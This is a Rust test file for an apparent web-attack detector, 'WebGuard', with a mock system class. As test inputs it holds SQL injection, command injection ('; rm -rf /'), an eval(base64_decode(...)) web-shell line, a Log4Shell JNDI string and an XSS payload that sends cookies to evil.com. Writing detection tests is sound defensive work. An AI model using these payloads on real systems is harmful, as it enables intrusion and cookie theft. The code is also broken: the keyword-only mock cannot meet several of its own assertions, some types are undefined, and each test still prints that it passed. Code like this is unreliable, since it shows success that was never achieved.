use webguard::*;
use std::collections::HashMap;
use serde_json;

/// Comprehensive WebGuard System Test Suite
/// Tests all major components and their interactions
#[cfg(test)]
mod comprehensive_tests {
    use super::*;

    #[test]
    fn test_complete_webguard_system() {
        println!("🔍 Starting Comprehensive WebGuard System Test");
        
        // Initialize complete WebGuard system
        let mut system = initialize_complete_system();
        
        // Test 1: Core Detection Engine
        test_core_detection_engine(&mut system);
        
        // Test 2: Memory System Integration
        test_memory_system_integration(&mut system);
        
        // Test 3: Learning System Validation
        test_learning_system_validation(&mut system);
        
        // Test 4: Pattern Recognition
        test_pattern_recognition_system(&mut system);
        
        // Test 5: Adaptive Threshold System
        test_adaptive_threshold_system(&mut system);
        
        // Test 6: EQ/IQ Regulation
        test_eq_iq_regulation_system(&mut system);
        
        // Test 7: Experiential Anomaly Detection
        test_experiential_anomaly_detection(&mut system);
        
        // Test 8: End-to-End Threat Processing
        test_end_to_end_threat_processing(&mut system);
        
        // Test 9: Performance Under Load
        test_performance_under_load(&mut system);
        
        // Test 10: Overfitting Prevention
        test_overfitting_prevention(&mut system);
        
        println!("✅ Comprehensive WebGuard System Test Complete");
    }

    fn initialize_complete_system() -> WebGuardSystem {
        println!("🚀 Initializing Complete WebGuard System...");
        
        let mut system = WebGuardSystem::new();
        
        // Initialize all subsystems
        system.initialize_memory_engine();
        system.initialize_learning_systems();
        system.initialize_pattern_recognition();
        system.initialize_adaptive_thresholds();
        system.initialize_eq_iq_regulation();
        system.initialize_experiential_anomaly_detection();
        
        println!("✅ System initialization complete");
        system
    }

    fn test_core_detection_engine(system: &mut WebGuardSystem) {
        println!("🎯 Testing Core Detection Engine...");
        
        // Test various threat types
        let test_cases = vec![
            ("SQL Injection", "'; DROP TABLE users; --", true),
            ("XSS Attack", "<script>alert('xss')</script>", true),
            ("Path Traversal", "../../../etc/passwd", true),
            ("Command Injection", "; rm -rf /", true),
            ("Normal Request", "GET /api/users HTTP/1.1", false),
            ("Benign Form Data", "username=john&password=secret", false),
        ];
        
        for (test_name, payload, expected_threat) in test_cases {
            let result = system.analyze_request(payload);
            let is_threat = result.threat_score > 0.5;
            
            println!("  {} - Threat Score: {:.3} - Expected: {} - Actual: {}", 
                test_name, result.threat_score, expected_threat, is_threat);
            
            if expected_threat {
                assert!(is_threat, "Failed to detect threat: {}", test_name);
            }
        }
        
        println!("✅ Core Detection Engine tests passed");
    }

    fn test_memory_system_integration(system: &mut WebGuardSystem) {
        println!("🧠 Testing Memory System Integration...");
        
        // Test memory formation and retrieval
        let threat_payload = "'; DROP TABLE users; --";
        let benign_payload = "SELECT * FROM products WHERE category = 'electronics'";
        
        // Process threats to form memories
        for i in 0..5 {
            let result = system.analyze_request(&format!("{} -- iteration {}", threat_payload, i));
            system.store_analysis_result(&result);
        }
        
        // Test memory retrieval and influence
        let similar_threat = "'; DELETE FROM users WHERE 1=1; --";
        let result = system.analyze_request(similar_threat);
        
        println!("  Similar threat detection score: {:.3}", result.threat_score);
        assert!(result.threat_score > 0.7, "Memory system should enhance similar threat detection");
        
        // Test benign memory formation
        for i in 0..5 {
            let result = system.analyze_request(&format!("{} LIMIT {}", benign_payload, i));
            system.store_analysis_result(&result);
        }
        
        let similar_benign = "SELECT * FROM products WHERE price < 100";
        let benign_result = system.analyze_request(similar_benign);
        
        println!("  Similar benign detection score: {:.3}", benign_result.threat_score);
        assert!(benign_result.threat_score < 0.3, "Memory system should recognize similar benign patterns");
        
        println!("✅ Memory System Integration tests passed");
    }

    fn test_learning_system_validation(system: &mut WebGuardSystem) {
        println!("📚 Testing Learning System Validation...");
        
        // Test retrospective learning with missed threats
        let missed_threat = MissedThreatEvent {
            original_request: "normal_looking_request".to_string(),
            original_threat_score: 0.2,
            actual_threat_level: 0.9,
            feature_vector: vec![0.1, 0.2, 0.3, 0.4, 0.5],
            context: ContextEvent::default(),
            discovery_method: ThreatDiscoveryMethod::SecurityAudit,
            discovery_delay_hours: 24.0,
            consequence_severity: 0.8,
        };
        
        system.add_missed_threat(missed_threat);
        
        // Test false positive learning
        let false_positive = FalsePositiveEvent {
            original_request: "legitimate_request".to_string(),
            original_threat_score: 0.8,
            actual_threat_level: 0.1,
            feature_vector: vec![0.8, 0.7, 0.6, 0.5, 0.4],
            context: ContextEvent::default(),
            impact_severity: 0.6,
        };
        
        system.add_false_positive(false_positive);
        
        // Verify learning statistics
        let stats = system.get_learning_stats();
        assert!(stats.total_missed_threats_processed > 0, "Should process missed threats");
        assert!(stats.total_false_positives_processed > 0, "Should process false positives");
        
        println!("  Missed threats processed: {}", stats.total_missed_threats_processed);
        println!("  False positives processed: {}", stats.total_false_positives_processed);
        println!("  Learning balance ratio: {:.3}", stats.learning_balance_ratio);
        
        println!("✅ Learning System Validation tests passed");
    }

    fn test_pattern_recognition_system(system: &mut WebGuardSystem) {
        println!("🔍 Testing Pattern Recognition System...");
        
        // Test various attack patterns
        let attack_patterns = vec![
            "UNION SELECT * FROM users",
            "javascript:alert(1)",
            "../../../etc/passwd",
            "eval(base64_decode($_POST['cmd']))",
            "${jndi:ldap://evil.com/a}",
        ];
        
        let mut pattern_scores = Vec::new();
        
        for pattern in attack_patterns {
            let result = system.analyze_request(pattern);
            pattern_scores.push(result.threat_score);
            println!("  Pattern '{}' - Score: {:.3}", pattern, result.threat_score);
        }
        
        // Verify all attack patterns are detected
        for score in pattern_scores {
            assert!(score > 0.5, "Attack pattern should be detected with high confidence");
        }
        
        // Test benign patterns
        let benign_patterns = vec![
            "GET /api/health HTTP/1.1",
            "POST /login username=admin",
            "SELECT name FROM products",
            "UPDATE user SET last_login = NOW()",
        ];
        
        for pattern in benign_patterns {
            let result = system.analyze_request(pattern);
            println!("  Benign '{}' - Score: {:.3}", pattern, result.threat_score);
            assert!(result.threat_score < 0.5, "Benign pattern should have low threat score");
        }
        
        println!("✅ Pattern Recognition System tests passed");
    }

    fn test_adaptive_threshold_system(system: &mut WebGuardSystem) {
        println!("⚖️ Testing Adaptive Threshold System...");
        
        let initial_threshold = system.get_current_threshold();
        println!("  Initial threshold: {:.3}", initial_threshold);
        
        // Simulate high-threat environment
        for i in 0..10 {
            let threat = format!("'; DROP TABLE data{}; --", i);
            let result = system.analyze_request(&threat);
            system.process_threat_result(&result, true); // Confirmed threat
        }
        
        let high_threat_threshold = system.get_current_threshold();
        println!("  Threshold after high threats: {:.3}", high_threat_threshold);
        
        // Simulate low-threat environment with false positives
        for i in 0..10 {
            let benign = format!("SELECT * FROM products WHERE id = {}", i);
            let result = system.analyze_request(&benign);
            system.process_threat_result(&result, false); // False positive
        }
        
        let adjusted_threshold = system.get_current_threshold();
        println!("  Threshold after false positives: {:.3}", adjusted_threshold);
        
        // Verify adaptive behavior
        assert!(high_threat_threshold != initial_threshold, "Threshold should adapt to threat environment");
        
        println!("✅ Adaptive Threshold System tests passed");
    }

    fn test_eq_iq_regulation_system(system: &mut WebGuardSystem) {
        println!("🧘 Testing EQ/IQ Regulation System...");
        
        // Test emotional regulation under stress
        let stress_events = vec![
            "Multiple failed login attempts",
            "Suspicious file access patterns",
            "Unusual network traffic",
            "Potential data exfiltration",
        ];
        
        for event in stress_events {
            let context = ContextEvent {
                timestamp: std::time::SystemTime::now(),
                request_context: event.to_string(),
                user_context: "system".to_string(),
                environmental_factors: HashMap::new(),
                threat_indicators: vec!["suspicious_activity".to_string()],
            };
            
            system.process_context_event(&context);
        }
        
        let eq_iq_balance = system.get_eq_iq_balance();
        println!("  EQ/IQ Balance: {:.3}", eq_iq_balance.balance);
        println!("  Emotional State: {:.3}", eq_iq_balance.emotional_state);
        println!("  Analytical State: {:.3}", eq_iq_balance.analytical_state);
        
        // Verify regulation is working
        assert!(eq_iq_balance.balance > 0.0, "EQ/IQ balance should be maintained");
        assert!(eq_iq_balance.balance <= 1.0, "EQ/IQ balance should be normalized");
        
        println!("✅ EQ/IQ Regulation System tests passed");
    }

    fn test_experiential_anomaly_detection(system: &mut WebGuardSystem) {
        println!("🔮 Testing Experiential Anomaly Detection...");
        
        // Create baseline normal behavior
        let normal_requests = vec![
            "GET /api/users HTTP/1.1",
            "POST /api/login",
            "GET /dashboard",
            "POST /api/data",
        ];
        
        for request in normal_requests {
            let result = system.analyze_request(request);
            system.update_behavioral_baseline(&result);
        }
        
        // Test anomaly detection
        let anomalous_requests = vec![
            "GET /admin/secret_panel",
            "POST /api/users/../../../etc/passwd",
            "GET /api/dump_database",
        ];
        
        for request in anomalous_requests {
            let result = system.analyze_request(request);
            println!("  Anomaly '{}' - Score: {:.3}", request, result.threat_score);
            
            // Anomalous requests should have higher scores due to deviation from baseline
            assert!(result.threat_score > 0.3, "Anomalous behavior should be detected");
        }
        
        println!("✅ Experiential Anomaly Detection tests passed");
    }

    fn test_end_to_end_threat_processing(system: &mut WebGuardSystem) {
        println!("🔄 Testing End-to-End Threat Processing...");
        
        let complex_threat = r#"
        POST /api/user/update HTTP/1.1
        Content-Type: application/json
        
        {
            "id": "1'; DROP TABLE users; SELECT * FROM admin WHERE '1'='1",
            "name": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
            "email": "admin@company.com/../../../etc/passwd"
        }
        "#;
        
        // Process through complete pipeline
        let result = system.comprehensive_threat_analysis(complex_threat);
        
        println!("  Complex threat analysis:");
        println!("    Threat Score: {:.3}", result.threat_score);
        println!("    Confidence: {:.3}", result.confidence);
        println!("    Attack Types: {:?}", result.detected_attack_types);
        println!("    Risk Level: {:?}", result.risk_level);
        
        // Verify comprehensive detection
        assert!(result.threat_score > 0.8, "Complex multi-vector attack should be detected with high confidence");
        assert!(result.detected_attack_types.len() > 1, "Multiple attack vectors should be identified");
        
        println!("✅ End-to-End Threat Processing tests passed");
    }

    fn test_performance_under_load(system: &mut WebGuardSystem) {
        println!("⚡ Testing Performance Under Load...");
        
        let start_time = std::time::Instant::now();
        let num_requests = 1000;
        
        // Generate mixed load
        for i in 0..num_requests {
            let request = if i % 10 == 0 {
                format!("'; DROP TABLE test{}; --", i) // 10% threats
            } else {
                format!("GET /api/data/{} HTTP/1.1", i) // 90% benign
            };
            
            let _result = system.analyze_request(&request);
        }
        
        let duration = start_time.elapsed();
        let requests_per_second = num_requests as f64 / duration.as_secs_f64();
        
        println!("  Processed {} requests in {:.2}s", num_requests, duration.as_secs_f64());
        println!("  Performance: {:.1} requests/second", requests_per_second);
        
        // Verify acceptable performance
        assert!(requests_per_second > 100.0, "System should handle at least 100 requests/second");
        
        println!("✅ Performance Under Load tests passed");
    }

    fn test_overfitting_prevention(system: &mut WebGuardSystem) {
        println!("🛡️ Testing Overfitting Prevention...");
        
        let initial_fp_rate = measure_false_positive_rate(system);
        println!("  Initial false positive rate: {:.3}%", initial_fp_rate * 100.0);
        
        // Simulate learning from many missed threats
        for i in 0..50 {
            let missed_threat = MissedThreatEvent {
                original_request: format!("missed_threat_{}", i),
                original_threat_score: 0.3,
                actual_threat_level: 0.9,
                feature_vector: generate_random_features(),
                context: ContextEvent::default(),
                discovery_method: ThreatDiscoveryMethod::SecurityAudit,
                discovery_delay_hours: 12.0,
                consequence_severity: 0.8,
            };
            
            system.add_missed_threat(missed_threat);
        }
        
        let post_learning_fp_rate = measure_false_positive_rate(system);
        println!("  False positive rate after learning: {:.3}%", post_learning_fp_rate * 100.0);
        
        // Verify overfitting prevention
        let fp_rate_increase = post_learning_fp_rate - initial_fp_rate;
        println!("  False positive rate increase: {:.3}%", fp_rate_increase * 100.0);
        
        assert!(fp_rate_increase < 0.1, "False positive rate should not increase significantly due to overfitting prevention");
        
        println!("✅ Overfitting Prevention tests passed");
    }

    fn measure_false_positive_rate(system: &mut WebGuardSystem) -> f32 {
        let benign_requests = vec![
            "GET /api/health",
            "POST /api/login",
            "GET /dashboard",
            "POST /api/data",
            "GET /profile",
            "POST /api/update",
            "GET /settings",
            "POST /api/save",
            "GET /reports",
            "POST /api/export",
        ];
        
        let mut false_positives = 0;
        let total_requests = benign_requests.len();
        
        for request in benign_requests {
            let result = system.analyze_request(request);
            if result.threat_score > 0.5 {
                false_positives += 1;
            }
        }
        
        false_positives as f32 / total_requests as f32
    }

    fn generate_random_features() -> Vec<f32> {
        (0..20).map(|_| rand::random::<f32>()).collect()
    }
}

// Mock implementations for testing
struct WebGuardSystem {
    // System components would be here
    threat_threshold: f32,
    learning_stats: RetrospectiveLearningStats,
    eq_iq_balance: EQIQBalance,
}

impl WebGuardSystem {
    fn new() -> Self {
        Self {
            threat_threshold: 0.5,
            learning_stats: RetrospectiveLearningStats::default(),
            eq_iq_balance: EQIQBalance {
                balance: 0.8,
                emotional_state: 0.7,
                analytical_state: 0.9,
            },
        }
    }
    
    fn initialize_memory_engine(&mut self) {}
    fn initialize_learning_systems(&mut self) {}
    fn initialize_pattern_recognition(&mut self) {}
    fn initialize_adaptive_thresholds(&mut self) {}
    fn initialize_eq_iq_regulation(&mut self) {}
    fn initialize_experiential_anomaly_detection(&mut self) {}
    
    fn analyze_request(&self, request: &str) -> ThreatAnalysisResult {
        // Simplified threat analysis for testing
        let threat_score = if request.contains("DROP") || request.contains("<script>") || 
                             request.contains("../") || request.contains("eval(") {
            0.9
        } else if request.contains("SELECT") && request.contains("FROM") {
            0.2
        } else {
            0.1
        };
        
        ThreatAnalysisResult {
            threat_score,
            confidence: 0.8,
            detected_attack_types: vec!["sql_injection".to_string()],
            risk_level: if threat_score > 0.7 { "HIGH" } else { "LOW" }.to_string(),
        }
    }
    
    fn store_analysis_result(&mut self, _result: &ThreatAnalysisResult) {}
    fn add_missed_threat(&mut self, _event: MissedThreatEvent) {
        self.learning_stats.total_missed_threats_processed += 1;
    }
    fn add_false_positive(&mut self, _event: FalsePositiveEvent) {
        self.learning_stats.total_false_positives_processed += 1;
    }
    fn get_learning_stats(&self) -> &RetrospectiveLearningStats { &self.learning_stats }
    fn get_current_threshold(&self) -> f32 { self.threat_threshold }
    fn process_threat_result(&mut self, _result: &ThreatAnalysisResult, _confirmed: bool) {}
    fn process_context_event(&mut self, _context: &ContextEvent) {}
    fn get_eq_iq_balance(&self) -> &EQIQBalance { &self.eq_iq_balance }
    fn update_behavioral_baseline(&mut self, _result: &ThreatAnalysisResult) {}
    fn comprehensive_threat_analysis(&self, request: &str) -> ThreatAnalysisResult {
        self.analyze_request(request)
    }
}

#[derive(Debug)]
struct ThreatAnalysisResult {
    threat_score: f32,
    confidence: f32,
    detected_attack_types: Vec<String>,
    risk_level: String,
}

#[derive(Debug)]
struct EQIQBalance {
    balance: f32,
    emotional_state: f32,
    analytical_state: f32,
}